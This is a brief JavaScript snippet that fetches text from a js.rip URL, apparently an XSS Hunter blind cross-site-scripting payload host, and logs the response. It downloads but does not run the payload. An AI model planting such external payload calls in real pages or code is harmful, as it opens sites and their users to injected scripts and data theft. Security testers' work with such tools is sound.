
fetch('https://js.rip/hhlt1r4khl')
  .then(response => response.text())
  .then(data => {
    console.log('XSS Hunter Response:', data);
  })
  .catch(error => {
    console.error('Error:', error);
  });
